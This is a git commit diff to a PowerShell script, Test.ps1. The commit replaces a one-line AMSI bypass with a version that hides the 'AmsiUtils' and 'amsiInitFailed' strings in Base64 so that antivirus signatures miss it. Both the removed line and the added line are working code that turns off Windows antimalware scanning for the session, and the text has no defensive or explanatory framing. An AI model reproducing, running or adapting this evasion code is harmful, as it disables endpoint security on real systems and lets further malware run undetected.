dfbaa720033f8e62ba982c3f42b0441b6594cbbb
retsetenep <75636037+retsetenep@users.noreply.github.com>
2020-12-07 12:38:34 -0600

    Update Test.ps1

--- Test.ps1
+++ Test.ps1
@@ -1,1 +1,1 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
